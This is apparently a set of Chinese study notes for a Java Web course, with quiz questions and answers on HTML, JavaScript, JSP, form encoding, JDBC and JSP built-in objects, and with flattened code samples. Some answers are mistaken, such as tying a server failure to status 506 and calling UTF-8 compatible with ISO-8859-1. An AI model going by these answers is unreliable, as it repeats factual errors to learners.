标签内容表示它所包围的内容是有序列表标签，而内容表示无序标签。 在表格标签中 &lt;table&gt;&lt;/ table&gt; :定义表格，表格的所有内容都写在这个标签之内&lt;caption&gt;&lt;/caption&gt; :定义标题，标题会自动出现在整张表格的上方&lt;tr&gt;&lt;/tr&gt; :定义表行&lt;th&gt;&lt;/th&gt; :定义表头，包含在 之间，表头中的文字会自动变成粗体&lt;td&gt;&lt;/td&gt; :定义表元(表格的具体数据)，包含在 之间 单击“百度”即可超链接到百度的主页，代码这样写&lt;a href&#x3D;”www.baidu.com“&gt;百度。 href的网址要用双引号引起来 标签的type:决定了表单元素的类型，可以为以下的值 text :文本框。是type的默认属性password:密码框radio:单选按钮，可以将多个单选按钮的name属性设置相同，使其成为一组。checked属性可设置，默认被选checkbox:复选框checked属性可设置默认被选reset:重置按钮，按下之后，所有的表单元素内容变为默认值button:普通按钮submit:提交按钮，按下之后，网页会将表单的内容提交给action设定的网页， action 的值 为空时提交给本页image:图片，但是点击它的效果与提交按钮一样，都会提交表单 标签的rows属性表示将页面横向分割 标签的src属性的值表示框架内容的地址 在html标签中要设置字体的样式需要使用的属性为 Size Font face ✅ color 要用的标签是 font，要用的他的face属性 要将两段文字Java和Web设置在同一行显示，可以使用: 1&lt;h7&gt;Java&lt;/h7&gt;&lt;h8&gt;Web&lt;/h8&gt; 标题标签只有1-6，超过范围的都会以默认字体、字号显示，并且没有换行 现有部分html代码如下: 1234567&lt;ol type=&quot;A&quot;&gt; &lt;li&gt;Java&lt;/li&gt; &lt;li&gt;Web&lt;/li&gt;&lt;/ol&gt; 请问这段代码在浏览器上显示结果是（ A.JavaB.Web ） type属性值为a时会显示有序序号a、b、c…type属性值为A时会显示有序序号A、B、C….type属性值为其他值时，会显示默认有序序号1、2、3、4…. 在table标签里，要合并一列的3个单元格需要使用哪个属性值 12td.rowspan=&quot;3&quot; //行 td.colsapn=&quot;3&quot; //列 现有部分关于单选按钮的Html代码： 1234&lt;input type=&quot;radio&quot; name=&quot;1&quot; checked&gt;男 &lt;input type=&quot;radio&quot; name=&quot;2&quot; checked&gt;女&lt;BR&gt; 在浏览器上显示的效果是（ “男”和“女”都会被默认选中 ） 两个单选按钮的name属性值不一样，说明他们分别是两组单选按钮，所以会被全部选中 第三章 JavaScript基础 下列关于JavaScript的说法错误的是（）。 A. JavaScript的语法和Java语言的语法非常类似。 B. JavaScript对大小写是敏感的。 C. JavaScript中的变量是弱变量类型，即变量的类型根据它被赋值的类型改变。 D. 服务器对JavaScript脚本程序进行编译、运行 ❌ javaScript可以嵌入到HTML中，是一种运行在客户端的语言，由客户端的浏览器进行解释执行，大小写敏感 在下面的JavaScript语句中，var arg1=10 定义了一个整型变量并赋值为10。 window.setTimeout(“fun()”,1000)表示的意思是，间隔1秒后，fun()函数被调用1次。 window对象的 status 属性用来指定浏览器状态栏中显示的临时消息。 在history对象中不能实现网页前进效果的方法是（）。 A. go(1) B. location C. back() ✅ D. forward() 在浏览器的状态栏中显示“这是状态栏”消息的代码是 window.status=”这是状态栏” 下列打开指定位置新窗口的代码中正确的是window.open(“window2.html”,”new”,”top=10” 在代码&lt;body onload=&quot;f1()&quot; onError=&quot;f2()&quot;&gt;&lt;input onFocus=&quot;g1()&quot; onClick=&quot;g2()&quot;&gt;&lt;/body&gt;中，一定会被调用的方法是 f1() 浏览器对JavaScript脚本程序进行解释执行。 JavaScript的3种注释写法为、&#x2F;注释内容、&#x2F;&#x2F;注释内容 若将JavaScript代码写在单独的test.js文件中，需要在调用它的HTML页面中插入的代码是&lt;script src=&quot;test.js&quot; type=&quot;javascript&quot;&gt;&lt;/script&gt;。 JavaScript的内置对象window负责操作浏览器窗口 window.alert() 弹出消息框 window.confirm() 确认框 window.prompt() 输入框 window.open() 新窗口的地址 window.close()方法可以关闭窗口 history对象包含用户的浏览历史等信息，其中history.forward()方法相当于单击浏览器上的后退按钮，history.back()方法相当于单击浏览器上的前进按钮。 history.back() 后退 history.forward() 前进 window.history.go(n) 正数 前进n页，负数 后退n页 在名为form的表单中有一个文本框account，其中的内容可以用代码form.account.value获得。 A. × 要用特定的函数来获得 用location对象实现跳转到网页a.html的代码是windows.location.href=&quot;a.html&quot;。 document对象从属于window对象。 用document对象可以进行一些简单网页属性的设置，通过document.title来访问标题，通过document.location来获取当前网页的地址。 以下哪些JavaScript变量的命名是错误的？ (1)var hello; (2)var Java; (3)var 123; (4)var x%x; (5)var $hello; (6)var _Script; (7)var for; 命名规范： 首位字符必须是字母A-Z，a-z，_ ，$。 其他位置上可以是 _ , $ , 0-9 , a-z ， A-Z 关键字不能命名： for 现有如下计时器代码，要让计时器正确的显示在文本框里，请补全缺失部分。（） 12345678910111213141516&lt;html&gt;&lt;body&gt; &lt;input type=&quot;text&quot; id=&quot;count&quot; /&gt; &lt;script type=&quot;text/javascript&quot;&gt; var num = 0; function startCount() &#123; document.getElementByld(&quot;count&quot;).value = num; ------------ num += 1; setTimeout(startCount, 1000); &#125; setTimeout(startCount, 1000); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; alert(num) 显示在弹出的消息框里， window.status&#x3D;num 显示在浏览器窗口的状态栏里， getElementByld(“count”).value &#x3D; num 少了对象名会出错 document.getElementByld(“count”).value &#x3D; num 将num附值给ID为count的文本的属性值value history对象的 （ go(-1) ） 方法要求窗口显示刚刚访问的前一个页面 history.back() 返回上一页 history.forward() 返回下一页 history.go(n) 如果n是正数前进n格，负数表示向后退n格 在JavaScript内置对象中，不能实现在当前页面跳转的代码是(window.open) window.open()在新窗口跳转 可以在当前页面跳转的有window.location.href , location.href , this.location.href , self.location.href , window.location.replace 下面代码可以实现在页面显示如图九九乘法表，请补全代码。 123456789101112131415161718&lt;html&gt;&lt;head&gt; &lt;title&gt;九九乘法表&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; for (var i = 1; i &lt;= 9; i++) &#123; for (var j = 1; j &lt;= i; j++) &#123; a = i + &quot;*&quot; + j + &quot;=&quot; + i * j + &quot; &quot; **document.write(a)** ___________________ &#125; **document.write(&quot;&lt;br&gt;&quot;);** _________________ &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; alert() 是在弹出的消息框显示内容 console.log()是在控制台显示内容 window.status()是在浏览器窗口的状态栏显示内容 document.write()可以在页面显示内容 第四章 JSP基本语法 下列关于JSP的说法错误的是（）。 A. JSP属于静态网页。 ❌ B. JSP将动态代码嵌入到静态的HTML中，从而产生动态的输出。 C. JSP页面是由JSP容器执行该页面的Java代码部分，然后实时生成HTML页面。 D. 在客户端的源代码中是看不到JSP页面中的Java代码的 JSP是动态页面 JSP页面在第一次运行的时候被JSP引擎转换为 ****Servlet 文件。 在下列注释中会发送到服务器的是（）。 A. &#x2F;注释内容&#x2F; B.&lt;%–注释内容–%&gt; C. &#x2F;&#x2F;注释内容 D. ✅ 下列关于JSP表达式的说法错误的是（）。 A. JSP表达式的作用是将其里面内容所运算的结果输出到客户端。 B. JSP表达式中的内容一定是字符串类型，或者能通过toString()函数转换成字符串的形式。 C. 在JSP表达式中不能出现多条语句。 D. 在JSP表达式中能用“；”结束。 ❌ JSP表达式：&lt;%=变量/返回值/表达式%&gt; JSP程序段：&lt;% java代码 %&gt; JSP声明： &lt;%! 代码 ;%&gt; URL传值： &lt;% String str = request.getParameter(&quot;arg1&quot;); %&gt; JSP指令： &lt;%@指令类别 属性=&quot;值&quot;%&gt; JSP动作： &lt;jsp:动作名 属性1=&quot;属性值1&quot; 属性n=&quot;属性值n&quot; /&gt; &lt;jsp:动作名&gt;相关内容&lt;/jsp:动作名&gt; JSP程序段的用法 &lt;%Java代码%&gt; 在JSP页面中定义一个Sring类型的Java全局变量str，正确的代码是&lt;%!Sring str;%&gt; 使用content Type 属性可以设置JSP的MIME类型和可选字符编码。 用于设置JavaBean属性的动作是&lt;jsp:setProperty&gt; 用于将请求跳转到另一个页面的JSP动作是 &lt;jsp:forward&gt; JSP注释一共有3种，分别是、&lt;%–注释内容–%&gt;、&#x2F;&#x2F;注释或&#x2F;注释**&#x2F;。 JSP程序段就是插入到JSP程序的Java代码段。 在JSP声明中可以定义网页中的局部变量这些变量在声明的那个JSP页面能使用。 在使用使用URL传值时传输的数据只能是String类型。 request对象获取请求信息的方法是getParameter()。 JSP的3个指令是page、include和 taglib page指令的import属性用来导入包。 当JSP程序出现未被捕获的异常时可以使用errorPage设置要跳转的页面。 include 动作 只会把文件中的输出包含进来。include 指令 是把文件包含到JSP页面。适合导入不会经常变化的资源。 include指令可以在JSP程序中插入多个外部文件。 用户可以在（ “&lt;jsp: 和 /&gt;” ） 标记之间插入动作 在“&lt;%!”和“%&gt;”标记之间声明的Java方法称为页面的成员方法，其（ 在整个页面内 ）有效。 在Java声明标记的声明的变量、方法在整个页面内有效 在程序段里声明的变量是局部变量，从定义之后有效 现有如下JSP代码片段。 123456&lt;%!int n=0;%&gt;&lt;% int m=0; (1); out.print(&quot;欢迎访问本网站！&lt;br&gt;&quot;); out.print(&quot;您是第&quot;+ (2) +&quot;个访问本站的客户。&quot;);%&gt; 要实现网络计数器的功能，请补全代码。 (1) n++ (2)n n是全局变量，m是局部变量，所以用全部变量进行累加 现有以下jsp代码片段。 123&lt;% String str=&quot;12&quot;; int number=Integer.parseInt(str); %&gt;该数字的平方为：&lt;%=number*number %&gt;&lt;HR&gt;&lt;a href=&quot;4.6urlP2.jsp?number=______&quot;&gt;到达p2&lt;/a&gt; 请问空格处填以下哪个代码可以用url传值? &lt;%=str+1%&gt; url传值只能传字符串， 运算表达式会语法错误，比如 24+3 &lt;%=str+number%&gt; 两个不同类型变量的值，语法错误 str 是变量无法传值 str是字符串拼接，不是进行计算 现有以下jsp代码片段。 123&lt;% String str=&quot;12&quot;; int number=Integer.parseInt(str); %&gt;该数字的平方为：&lt;%=number*number %&gt;&lt;HR&gt;&lt;a href=&quot;4.6urlP2.jsp?number=&lt;%=str+6%&gt;&quot;&gt;到达p2&lt;/a&gt; 请问能不能用url传值到4.6urlP2.jsp?如果能传的值是多少？ 126 是直接进行了一个拼接 现有如下JSP代码片段，用来计算矩形的面积。 123456789101112131415&lt;% int row=Integer.parseInt(request.getParameter(&quot;&lt;tr&gt;&quot;));int col = Integer.parseInt(request.getParameter(&quot;&lt;td&gt;&quot;));out.print(&quot;&lt;table border=1&gt;&quot;);for(int i = 1; i &lt;= row; i++)&#123; out.print(&quot;&lt;tr&gt;&quot;); for(int j = 1; j &lt;= col; j++)&#123; out.print(&quot;&lt;td&gt;&quot;); out.print(i*j); out.print(&quot;&lt;/td&gt;&quot;); &#125; out.print(&quot;&lt;/tr&gt;&quot;);&#125;out.print(&quot;&lt;/table&gt;&quot;);%&gt; 现在用jsp:param动作“名字-值”来为矩形的长和宽传递参数，请问传值的“名字”应该为（）。 &lt;tr&gt;和&lt;td&gt; 第五章 表单开发 下列关于表单的说法不正确的是（）。 A. 表单是可以由用户输入并提交给客户端的一个图形界面。 ❌ B. 在表单中可以输入一些内容，这些输入功能由表单元素提供。 C. 在表单中一般有一个按钮负责提交。 D. 单击“提交”按钮，表单元素中的内容会提交给服务器端。 表单是一种可以由用户输入，并提交给服务器端的一个图形界面 有下面两段代码： page1.jsp 12345&lt;form action=”page2.jsp”&gt;请您输入账号：&lt;input name=”account” type=”text”&gt;&lt;br&gt;请您输入密码：&lt;input name=”password” type=”password”&gt;&lt;br&gt;&lt;input type=”submit” value=”登录”&gt;&lt;/form&gt; page2.jsp 12345&lt;%//获得表单中name=account的表单元素中输入的值，赋值给strString str1=request.getParameter(“account”);String str2=request.getParameter(“zhanghu”);%&gt; 若不输入数据，直接单击“登录”按钮，则str1和str2的值分别是 ””、null 在浏览器的地址栏上的URL中隐藏传输的参数，需要将标签的method属性值设置为post 下列说法中错误的是（）。 A. 在提交表单数据时只能用post方法。 ❌ B. 以文本框在源代码中出现的顺序 从数组的第0位开始向后放置同名表单元素的数据。 C. 除了复选框、多选列表框等，其他一些表单元素也可以设置为同名。 D. 获取同名表单元素中数据的方法为request.getParameterValue(arg)。 ****在提交表单数据时可以用 get、post 下列表单中不是单一表单元素的是（）。 A. 密码框 B. 复选框 ✅ C. 文本框 D. 单选按钮 在表单提交的过程中，不能解决中文乱码问题的方案为（）。 A. 将获取到的数据转换成gb2312的格式。 B. 把文件头上的字符集设置为中文字符集。 ✅ C. 在获取数据之前先修改request的编码方式。 D. 利用过滤器对整个Web应用进行统一的编码过滤。 虽然表单传值的方法不是绝对安全的，但由于其简单性和平台支持的多样性，很多程序还是用表单传值。 表单元素放在标签之间。 表单元素提交给服务器端的哪个页面可以用中的action属性决定。 在表单中提交请求的两种常见方式是get和post，默认情况下是get方式。 捆绑表单元素数据的获取方法为request.getParameterValues()。 将Type属性设置为hidden可以隐藏表单元素。 直接修改request的编码方式来解决中文乱码问题的request.setCharacterEncoding(&quot;UTF-8&quot;) Http是无状态的协议，在页面之间传递值时必须通过服务器。 在用JavaScript对表单的输入进行验证时，需要将“提交”按钮的类型设置为button。 现有文件名为charCode.jsp源代码，请问文件运行后能不能传值到指定页面，如果不能请找出错误代码。（） 12345678910111213141516&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot;%&gt;&lt;html&gt; &lt;body&gt; &lt;form acton=&quot;charCode.jsp&quot;&gt; 请您输入鲜花的模糊资料：&lt;BR&gt; &lt;input type=&quot;hidden&quot; name=&quot;flower&quot; type=&quot;text&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;查询&quot;&gt; ❌ &lt;/form&gt;&lt;% String flower = request.getParameter(&quot;flower&quot;);if(flower!=null)&#123; out.println(&quot;花朵名称为：&quot; + flower);&#125;%&gt;&lt;/body&gt;&lt;/html&gt; 本页面既当客户端提交表单页面，又当服务器端接收表单页面 虽然输入框被隐藏了，客户端无法输入值，但还是可以传值到接收页面； 类型为普通按钮button是无法向接收页面提交表单信息，submit才能提交 post方法是将表单内各字段与其内容以键-值对放在http报文的哪个部分？（） http请求报文的实体主体部分 Get方法是将传值内容以键值对放在http请求报文请求行的URL字段 Post方法是将传值内容以键值对放在http请求报文的实体主体部分 如果现在因为服务器故障而无法返回请求的页面，返回状态码506 varlant also negotiates 2xx 表示成功 204 No Content 表示服务器成功处理请求，但不需要返回任何实体内容 3xx 表示重定向，完成请求后还需要进一步采取措施。 304 Not Modified 表示客户端发送了一个带条件的GEt请求，文档内容没被改变 4xx 表示客户的差错 5xx 表示服务器的差错 UTF-8 中文字符使用24位编码，英文字符使用8位编码，兼容ASCII和ISO-8859-1。不兼容中文字符使用16位编码的GB232&#x2F;GBK。 Unicode 中文字符和英文字符使用16位或32位编码，不兼容GBK GB2312 中文字符使用16位编码，英文字符使用8位编码，兼容ISO-8859-1 ISO-8859-1 使用8位编码，无法显示中文字符，兼容ASCII 现有tomcat服务器配置文件server.xml部分内容，及客户端提交表单页面a.jsp，和服务器端表单接收页面b.jsp，客户提交表单后中文显示乱码，请用以下哪种办法可以正确显示中文字符。 123456789101112131415161718192021222324252627282930313233343536373839404142434445Server.xml&lt;Connector connectionTimeout=&quot;20000&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; redirectPort=&quot;8443&quot; URIEncoding=&quot;gbk&quot;/&gt;a.jsp&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=ISO-8859-1&quot;%&gt;&lt;html&gt; &lt;body&gt; &lt;form action=&quot;b.jsp&quot; method=&quot;get&quot;&gt; 请您输入学生的模糊资料：&lt;BR&gt; &lt;input name=&quot;stuname&quot; type=&quot;text&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;查询&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt;b.jsp&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot;%&gt;&lt;html&gt; &lt;body&gt; &lt;% String stuname = request.getParameter(&quot;stuname&quot;); out.println(&quot;输入的查询关键字为:&quot; + stuname); %&gt; &lt;/body&gt;&lt;/html&gt; 改a.jsp里代码charset=gb2312; 改b.jsp里的代码 charset=utf-8 post方法传值键-值对在请求报文实体主体部分，默认用iso-8859-1编码，可以在接收页面转码交给服务器。 get方法传值键-值对在请求报文请求行的URL字段，默认用iso-8859-1编码，需要在客户提交页面转码交给服务器 第六章 JSP访问数据库 下列关于JDBC技术的说法错误的是（）。 A. JDBC相关的API存放在java.sql包中。 B. JDBC可以适用于任何语言。 ❌ C. JDBC提供了一系列的API，让Java语言编写的代码连接数据库，对数据库的数据进行添加、删除、修改和查询。 D. 在Java技术系列中，访问数据库的技术叫做JDBC。 JDBC只能适用于JAVA java.sql.Connection负责 连接数据库 java.sql.Statement 负责执行数据库SQL语句。 java.sql.ResultSet :负责存放查询结果。 DriverManager.getConnection(“URL”，”用户名”，“密码”)的功能是获取数据库连接 下列关于ResultSet类的说法错误的是（）。 A. 游标是在ResultSet中的一个可以移动的指针，它指向一行数据，初始时指向第一行的前一行。 B. 从ResultSet的某一行中通过getXXX()方法取数据的每一列能取无限次。 ❌ C. 当游标指向某一行时可以通过ResultSet的getXXX(“列名”)方法得到这一行的某个数据。 D. ResultSet的next()方法的返回值是一个布尔类型的数据 从某一行中通过 getXXX() 方法取数据每一列只能取一次 在Connection中设置executeUpdate()不自动提交的代码是connection.setAutoCommit(false) 下列关于厂商驱动的说法错误的是（）。 A. 驱动程序一般弹性较差，往往只适用于自己的数据库系统。 B. 使用厂商驱动的方法完全不依赖于ODBC，但是只能在Windows操作系统上使用。 ❌ C. 不同驱动程序和不同数据库可以采用不同驱动程序名称和URL。 D. 使用厂商驱动需要下载相应的厂商驱动包，将其复制到Web项目的“WEB-INF&#x2F;lib”下。 连接到本机MySQL数据库上的SCHOOL数据库的代码为（），其用户名为”root”，密码为“manager”。 1Connection conn=DriverManager.getConnection(“jdbc:mysql://localhost:3306/SCHOOL”,”root”,”manager”); MySQL的默认数据库端口为3306 mssql的默认端口是1433 一个典型的JDBC按照（）顺序编写。 指定驱动 2. 获得与数据的连接 3. 使用statement接口运行SQL语句 4. 处理SQL语句的运行结果 5. 关闭数据库连接 下列关于JDBC-ODBC桥的说法中错误的是（）。 A. ODBC桥接比较简单，支持所有操作系统上的数据库连接。 ❌ B. 由ODBC连接到特定的数据库之后，JDBC只需要连接到ODBC就可以了。 C. ODBC几乎可以支持在Windows平台下运行的所有数据库。 D. 通过ODBC就可以连接到ODBC支持的任意一种数据库 ODBC只能在Windows下 在java.sql包中负责执行数据库SQL语句的类是java.sql.Statement 数据库连接有两种方式，分别是数据库厂商驱动连接和JDBC-ODBC桥接方式。 ODBC：Open Database Connectivity 开放数据库互连 JDBC：Java Database Connectivity Java数据库连接 加载数据库驱动类的代码是Class.forName(&quot;驱动名&quot;) statment.excuteUpdate(sql)主要用来执行添加数据、删除数据、修改数据的SQL语句，其返回值代表的是这条sql语句执行受影响的行数 statement.executeQuery(sql)主要用来执行查询数据的SQL语句，它的返回值是ResultSet类型，用于存放SQL语句执行后返回的结果。 PreparedStatment的setString(n,参数)方法可以将第n个“？”传递的参数代替。 可以使用Connection类来定义executeUpdate()方法是否自动提交SQL语句的结果，并进行事务的提交或回滚。 通过ODBC可以连接到ODBC支持的任意一种数据库，这种连接方式叫做JDBC-ODBC桥 如果远程MySQL数据库服务器的IP地址是202.115.128.123，进入此服务器MySQL命令行客户端管理工具的命令为（）。 1mysql -h 202.115.128.123 root -p 查询结果集ResultSet是以统一的行列形式组织数据，执行“ResultSet rs=stat.executeQuery(“select bid,name,author,publish,price from book”);”语句，得到的结果集rs的列数为（）。 5 向数据库添加数据，可以获得成功添加条数的方法是（）。 A. executeUpdate() ✅ B. getString() C. createStatement() D. executeQuery() executeQuery() 发送查询SQL语句，返回结果集。 createStatement() 与数据库建立连接，打开数据库。 executeUpdate() 返回一个整型，意思为这条sql语句执行受影响的行数，即成功添加的条数。 在游标的控制中，以下部分代码能实现倒序奇数行记录输出的是（）。 C. ✅ 123456rs.afterLast();while(rs.previous())&#123; int i=rs.getRow(); if(i%2&lt;&gt;0)&#123;……&#125;……&#125; rs.afterLast() 将游标移到结果集的最后一行之后。 rs.last() 将游标移到结果集的最后一行。 rs.befortFirst() 将游标移到结果集的第一行之前。 if(i%2==0) 判断是否为偶数。 if(i%2==1) 判断是否为奇数。 if(i%2&lt;&gt;0) 判断是否为奇数。 关于连接池的使用，下面描述正确的是（）。 在连接池集合中创建连接对象可以使用add()方法 设定连接池最大连接数可以防止用户无限制地与数据库连接。 使用完连接对象放回连接池数组 add() 从连接池数组中取出一个连接对象remove() 第七章 JSP内置对象(1) 下列关于内置对象的说法错误的是（）。 A. 在所有的JSP页面中，直接调用内置对象都是合法的。 B. 内置对象是自动载入的，因此不需要直接实例化。 C. 在JSP规范中定义了4种内置对象。 ❌ D. 内置对象是通过Web容器来实现和管理的。 JSP 规范中定义了九种内置对象， out 管理对客户端的输出 request 得到客户端的请求信息 response 向客户端发出响应 session 保存同一客户端一次会话过程中的一些信息 application 表示整个应用的环境的信息 exception 表示页面上发生的异常，可以通过它获得页面异常信息 page 表示的是当前 JSP 页面本身，就像Java 类定义中的 this 一样 pageContext 对象:表示的是此 JSP 的上下文 config 对象:表示此 JSP 的 ServletConfig 下列内置对象中 exception 用来表示页面上发生异常。 out对象管理缓冲区方法中，清除缓冲区里的数据但不把数据写入客户端的是 ****void clear() 在request对象的方法中，用来得到请求的URL地址的方法是request.getRequestURL() 下列关于jsp:forward和response的sendRedirect方法进行重定向的说法中错误的是（）。 A. forward方法只能在同一个Web应用程序内的资源之间转发请求。 B. 与redirect方法相比，forward方法的效率较高。 C. forward方法属于服务器端去请求资源，而redirect方法让客户端重新向服务器端请求一遍。 D. forward转发的页以及转发到的目标页面不能共享request里面的数据，但redirect方法可以。 ❌ forward 方法属于服务器端去请求资源，客户端浏览器的地址不变 redirect 客户端重新请求一 遍，所以地址显示栏会变 从数据共享来看 forward 转发的页面，以及转发到的目标页面能够共享 request 里面的数据。 redirect 转发的页面以及转发到的目标页面不能共享 request 里面的数据。 response对应的类是 javax.servlet.http.HttpServletResponse() Cookie.setMaxAge(int second)用来设置设置Cookie的存活时间的代码是（）。 Cookie可以持久地保持一些和客户相关的信息 在解决Cookie的安全问题时可以采用及时删除Cookie的方法。下列做法不能删除一个已经存在的Cookie的是（）。 A. 使用跨站脚本技术 XSS ✅ B. 通过浏览器删除Cookie C. 给Cookie赋空值 D. 禁用Cookie 在JSP页面中不需要定义就可以直接使用的对象叫内置对象 在JSP的内置对象中，out对象负责管理对客户端的输出，主要有两种输出方法，分别是print()和println()。 out对象的close()方法可以强制终止当前页面的剩余部分向浏览器输出。 request对象对应的类型是javax.servlet.http.HttpServletRequest 负责得到客户端请求的内置对象是request，负责身客户端发出响应的内置对象是response。 用response进行重定向的方法是response.sendRedirect(目标页面路径)。 response的sentError()方法用于向客户端发送HTTP状态码的出错信息。 Cookie是一个小的文本数据，由服务器端产生，发送给本地用户 在一般情况下，Cookie中的值是以key-value的形式进行表达的。 response.addCookie(Cookie c)，通过该方法将 Cookie 写入客户端。 Cookie.setMaxAge(int second) , 通过该方法设置 Cookie 的存活时间。Cookie[] request.getCookies() , 读取客户端传过来的 Cookie ，以数组形式返回。 现有部分有关JSP缓存与Servlet缓存代码段，请问页面输出结果为（ 胜 战病！毒）。 12345678&lt;% out.print(&quot;战&quot;); response.getWriter().print(&quot;胜&quot;);out.print(&quot;病&quot;); out.flush();out.print(&quot;毒&quot;);response.getWriter().print(&quot;！&quot;); %&gt; out对象先输出到JSP缓存再到Servlet缓存最后到页面。 response.getWriter()直接输出到Servlet缓存再到页面。 （1）out.print(“战”);&#x2F;&#x2F;将“战”输出到JSP缓存 （2）response.getWriter().print(“胜“); &#x2F;&#x2F;将“胜”输出到Servlet缓存，最先输出到页面的是“胜”。 （3）out.print(“病”); &#x2F;&#x2F;将“病”输出到JSP缓存，排在“战”后面，JSP缓存队列为“战、病”。 （4）out.flush(); &#x2F;&#x2F;手动刷新JSP缓存并将“战、病”输出到Servlet缓存，排在“胜”的后面，现在Servlet缓存队列为“胜、战、病“。 （5）out.print(“毒”); &#x2F;&#x2F;将“毒“输出到JSP缓存，现在JSP缓存队列为”毒“。 （6）response.getWriter().print(“！”); &#x2F;&#x2F;将“！“输出到Servlet缓存，现在Servlet缓存队列为“胜、战、病、！“。 | （7）程序结束JSP缓存输出到Servlet缓存，现在Servlet缓存队列为“胜、战、病、！、毒“，最后输出到客户端页面。 现有部分代码如下，出现错误提示为“java.lang.NumberFormatException: null”，请帮同学解决问题（） 123456789101112131 &lt;%2 for (int i = 1; i &lt; 10; i++) &#123;3 %&gt;4 &lt;a href=&quot;05_1.jsp?num=&lt;%=i%&gt;&quot;&gt;&lt;%=i%&gt;&lt;/a&gt;&lt;br&gt;5 &lt;%6 &#125;7 %&gt;8 &lt;%9 String numstr = null;10 numstr = request.getParameter(&quot;num&quot;);11 int num1 = Integer.parseInt(numstr);12 %&gt;13 该数字的平方为&lt;%=num1*num1%&gt; 在第11行和第13行后分别加入if(numstr ! = null)&#123; 和 &lt;%&#125;%&gt; 获取数据时出现空值，所以做一个非空判断 有如下程序片段： 1234&lt;form&gt; &lt;input type=”text” name=”number”&gt; &lt;input type=”submit” value=”提交”&gt;&lt;/form&gt; 下面（）语句可以获取用户输入的信息。 request.getParameter(&quot;number&quot;); response 内置对象是对客户的请求做出响应，向客户端发送数据的。 request 得到客户端的请求信息session 保存同一客户端一次会话过程中的一些信息application 表示整个应用的环境信息response 向客户端发出响应 现有a.jsp、b.jsp、c.jsp三个页面，如果运行a.jsp页面在“输入学生姓名：”输入框内输入Rose，点击查询按钮以后页面会显示什么内容（）。 输入学生姓名是：null 1234567891011a.jsp&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; contentType=&quot;text/html; charset=gb2312&quot; %&gt; &lt;html&gt; &lt;body&gt; &lt;form action=&quot;b.jsp&quot;&gt; 输入学生姓名：&lt;input type=&quot;text&quot; name=&quot;stuname&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;查询&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 123456789b.jsp&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; contentType=&quot;text/html; charset=gb2312&quot; %&gt; &lt;html&gt; &lt;body&gt; &lt;% response.sendRedirect(&quot;c.jsp&quot;); %&gt; &lt;/body&gt; &lt;/html&gt; 12345678910c.jsp&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; contentType=&quot;text/html; charset=gb2312&quot; %&gt; &lt;html&gt; &lt;body&gt; &lt;% out.println(&quot;输入学生姓名是：&quot;+request.getParameter(&quot;stuname&quot;)+&quot;&lt;br&gt;&quot;); %&gt; &lt;/body&gt; &lt;/html&gt; 如果想让else程序段内容成功跳转到b.jsp页面，请补全代码（）。 1234567891011121314151617181920&lt;%String name=request.getParameter(&quot;userName&quot;);String password=request.getParameter(&quot;pwd&quot;);if(&quot;zhangsan&quot;.equals(name)&amp;&amp;&quot;123&quot;.equals(password))&#123;out.print(&quot;成功登陆，3秒钟后进入loginSuccess.jsp页面&quot;);response.setHeader(&quot;refresh&quot;, &quot;3;url=a.jsp&quot;);return;&#125;else&#123;&#125;-----------------%&gt; %&gt;&lt;jsp:forward page=&quot;b.jsp&quot;/&gt;&lt;% 现有cookie相关部分代码如下，请问当前cookie的有效时间为（）。 关闭浏览器时失效 12345678&lt;% String str=&quot;12&quot; ; int number=Integer.parseInt(str); %&gt; 该数字的平方为：&lt;%=number*number %&gt; &lt;HR&gt; &lt;% Cookie cookie=new Cookie(&quot;number&quot;,str); cookie.setMaxAge(-10); response.addCookie(cookie); %&gt; &lt;a href=&quot;b.jsp&quot;&gt;到达p2&lt;/a&gt; cookie.setMaxAge(int time) 设置存活时间 time正整数，表示存活的秒数 time负数，代表临时cookie，浏览器关闭时失效 time 0 ，表示通知浏览器删除相应的cookie对象 第八章 JSP内置对象(2) 下列关于session的说法错误的是（）。 A. session能够跨页保持。 B. session负责保存同一个客户端一次会话过程中的一些信息。 C. 在访问网站时，服务器端自动分配一个session对象给用户使用。 D. 对于同一个用户，当网站的页面改变时，用户使用的session也会改变。 ❌ 通过session.setAttribute(String name,Object obj)方法可以将内容保存在session中。 session.setAttribute(String name,Object obj)中的第2个参数可以是自定义类型。 下列关于sessionId的说法错误的是（）。 A. 的第一次访问时，服务器端都有一个session分配了一个sessionId。 B. 对于每一个session，服务器端都有一个sessionId来标识它。 C. 在客户端访问下一个页面时，不会将sessionId传递给服务端。 ❌ D. 对于不同的客户来说，每个人的session是不同的。 显示某个页面被访问的次数可以用application对象 excepiton对象对应的类是 java.lang.Excepiton 。 pageContext 对象提供了对JSP页面中所有对象及命名空间的访问。 在服务器启动后就会自动创建application对象，这个对象会一直保存，直到服务器关闭为止。 session对应的类是 javax.servlet.http.HttpSession 将session中的内容全部移除的方法是void session.invalidate() 对于每一个session，服务器端都有一个sessionId来标识它 获得当前session在服务器端的ID的方法是String session.getId(); 对于一个Web容器而言，所有的用户共同使用一个session对象。❌ application对应的类是javax.servlet.ServletContext config对象是在一个JSP程序初始化时JSP引擎向它传递消息用的。 page对象指向当前JSP程序本身 在JSP中保存用户会话信息使用（ session ）对象。 如果选择一个对象保存聊天室信息，则选择（ application ）。 哪个方法是保存session中关键字是key的对象 1public void setAttibute(String key,Object obj) 现有以下部分代码段，主要功能可以实现将物品添加到购物车，请补全代码。 123456789101112&lt;form action=&quot;order.jsp&quot; method=&quot;post&quot;&gt; 三国演义&lt;input name=&quot;goods&quot; type=&quot;hidden&quot; value=&quot;三国演义&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;添加到购物车&quot;&gt;&lt;/form&gt;&lt;% ArrayList 